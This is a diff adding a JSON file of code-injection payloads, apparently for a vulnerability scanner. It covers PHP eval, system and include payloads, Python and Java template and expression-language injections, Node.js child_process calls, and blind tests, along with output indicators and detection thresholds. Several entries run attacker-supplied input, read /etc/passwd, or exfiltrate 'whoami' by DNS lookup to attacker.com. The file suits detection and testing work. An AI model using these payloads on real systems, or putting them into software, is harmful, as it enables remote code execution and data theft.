@@ -1,0 +1,213 @@
+{
+  "payloads": {
+    "php_generic": {
+      "eval_based": [
+        "eval('echo \"CODE_TEST\";');",
+        "eval('phpinfo();');",
+        "assert('CODE_TEST === \"CODE_TEST\"');",
+        "${eval($_POST['cmd'])}",
+        "eval(base64_decode($_GET['x']));",
+        "assert($x);",
+        "call_user_func('eval', 'echo CODE_TEST;');",
+        "create_function('', 'echo CODE_TEST;');",
+        "preg_replace('/(.*)/e', 'echo CODE_TEST', 'x');",
+        "usort($a, 'echo CODE_TEST');",
+        "array_walk($a, 'echo CODE_TEST');",
+        "array_map('echo CODE_TEST', $a);"
+      ],
+      "system_based": [
+        "system('echo CODE_TEST');",
+        "exec('echo CODE_TEST');",
+        "shell_exec('echo CODE_TEST');",
+        "passthru('echo CODE_TEST');",
+        "popen('echo CODE_TEST', 'r');",
+        "proc_open('echo CODE_TEST', $d, $p);",
+        "system($_GET['cmd']);",
+        "exec($_POST['c']);",
+        "`echo CODE_TEST`;",
+        "<?=`echo CODE_TEST`;?>"
+      ],
+      "file_include": [
+        "include($_GET['file']);",
+        "require($_POST['path']);",
+        "include('file://' . $_GET['url']);",
+        "include('php://input');",
+        "include('data://text/plain;base64,' . base64_encode('<?php echo CODE_TEST; ?>'));",
+        "include('glob://' . $_GET['pattern']);",
+        "include('zip://' . $_GET['archive'] . '#' . $_GET['file']);"
+      ],
+      "assert_based": [
+        "assert($_GET['code']);",
+        "assert('strpos(\"CODE_TEST\", \"CODE_TEST\") !== false');",
+        "assert('CODE_TEST');",
+        "assert(base64_decode($_GET['x']));"
+      ]
+    },
+    "python_generic": {
+      "eval_based": [
+        "eval('print(\"CODE_TEST\")');",
+        "eval('__import__(\"os\").system(\"echo CODE_TEST\")');",
+        "exec('print(\"CODE_TEST\")');",
+        "eval(input());",
+        "exec(request.args.get('c'));",
+        "__import__('os').system('echo CODE_TEST');",
+        "compile('print(\"CODE_TEST\")', '<string>', 'exec');",
+        "eval(compile('print(\"CODE_TEST\")', '<string>', 'exec'));"
+      ],
+      "os_system": [
+        "os.system('echo CODE_TEST');",
+        "subprocess.call('echo CODE_TEST', shell=True);",
+        "os.popen('echo CODE_TEST');",
+        "__import__('os').system('echo CODE_TEST');",
+        "commands.getoutput('echo CODE_TEST');",
+        "os.system(request.args.get('cmd'));"
+      ],
+      "template_injection": [
+        "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}",
+        "{{ request.application.__globals__.__builtins__.__import__('os').popen('echo CODE_TEST').read() }}",
+        "{{ config.__class__.__init__.__globals__['os'].popen('echo CODE_TEST').read() }}",
+        "{% for item in [].__class__.__base__.__subclasses__() %}{% if 'Popen' in item.__name__ %}{{ item('echo CODE_TEST', shell=True, stdout=-1).communicate() }}{% endif %}{% endfor %}",
+        "${7*7}",
+        "#{7*7}",
+        "{{ 7 * 7 }}"
+      ]
+    },
+    "java_generic": {
+      "runtime_exec": [
+        "Runtime.getRuntime().exec('echo CODE_TEST');",
+        "Runtime.getRuntime().exec(new String[]{'sh', '-c', 'echo CODE_TEST'});",
+        "new ProcessBuilder('echo', 'CODE_TEST').start();",
+        "new ProcessBuilder(new String[]{'sh', '-c', 'whoami'}).redirectErrorStream(true).start();",
+        "javax.script.ScriptEngineManager factory = new javax.script.ScriptEngineManager(); javax.script.ScriptEngine engine = factory.getEngineByName('JavaScript'); engine.eval('java.lang.Runtime.getRuntime().exec(\"echo CODE_TEST\")');"
+      ],
+      "el_injection": [
+        "${Runtime.getRuntime().exec('echo CODE_TEST')}",
+        "#{T(java.lang.Runtime).getRuntime().exec('echo CODE_TEST')}",
+        "${T(java.lang.Runtime).getRuntime().exec('echo CODE_TEST')}",
+        "#{T(java.lang.Runtime).getRuntime().exec(new String[]{'sh','-c','whoami'})}",
+        "%{(#cmd='echo CODE_TEST').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())}"
+      ]
+    },
+    "nodejs_generic": {
+      "eval_based": [
+        "eval('console.log(\"CODE_TEST\")');",
+        "eval('require(\"child_process\").exec(\"echo CODE_TEST\")');",
+        "eval(req.query.code);",
+        "Function(req.body.code)();",
+        "vm.runInNewContext(code);"
+      ],
+      "child_process": [
+        "require('child_process').exec('echo CODE_TEST', (err, stdout) => console.log(stdout));",
+        "require('child_process').execSync('echo CODE_TEST');",
+        "require('child_process').spawn('echo', ['CODE_TEST']);",
+        "require('child_process').exec(req.query.cmd);"
+      ],
+      "template_injection": [
+        "${7*7}",
+        "#{7*7}",
+        "{{7*7}}",
+        "<%= 7*7 %>",
+        "<%- 7*7 %>",
+        "${require('child_process').execSync('echo CODE_TEST')}"
+      ]
+    },
+    "blind_detection": {
+      "time_based": [
+        "; sleep(3)",
+        "'; sleep(3) //",
+        "\"; sleep(3) //",
+        "os.system('sleep 3')"
+      ],
+      "dns_exfiltration": [
+        "'; system('nslookup $(whoami).attacker.com') //",
+        "os.system('nslookup whoami.attacker.com')"
+      ],
+      "conditional_output": [
+        "; echo 'CODE_TEST'; //",
+        "\"; echo 'CODE_TEST'; #"
+      ]
+    }
+  },
+  "indicators": {
+    "php_output": [
+      "CODE_TEST",
+      "PHP Version",
+      "PHP License",
+      "System ",
+      "Build Date",
+      "php.ini",
+      "extension_dir",
+      "upload_tmp_dir",
+      "extension_loaded"
+    ],
+    "python_output": [
+      "CODE_TEST",
+      "Python",
+      "__main__",
+      "<module>",
+      "os.system",
+      "subprocess",
+      ">>>",
+      "Traceback",
+      "TypeError",
+      "NameError"
+    ],
+    "java_output": [
+      "CODE_TEST",
+      "java.",
+      "Runtime",
+      "ProcessBuilder",
+      "NullPointerException",
+      "Exception",
+      "at java",
+      "java version",
+      "Java(TM)"
+    ],
+    "nodejs_output": [
+      "CODE_TEST",
+      "child_process",
+      "require(",
+      "console.log",
+      "Error:",
+      "undefined",
+      "nodejs",
+      "node -v"
+    ],
+    "error_indicators": [
+      "Parse error",
+      "SyntaxError",
+      "NameError",
+      "TypeError",
+      "Exception",
+      "Fatal error",
+      "Error:",
+      "Traceback",
+      "not defined",
+      "is not a function"
+    ],
+    "template_indicators": [
+      "49",
+      "7777777",
+      "49.0",
+      "config",
+      "SECRET_KEY",
+      "DATABASE_URL",
+      "os.popen",
+      "Popen"
+    ]
+  },
+  "detection_config": {
+    "eval_confidence_threshold": 0.85,
+    "system_confidence_threshold": 0.90,
+    "template_confidence_threshold": 0.80,
+    "error_stack_confidence_threshold": 0.75,
+    "max_payload_test_count": 10,
+    "include_file_indicator": [
+      "root:",
+      "/etc/passwd",
+      "bin/",
+      "Windows",
+      "Administrator"
+    ]
+  }
+}
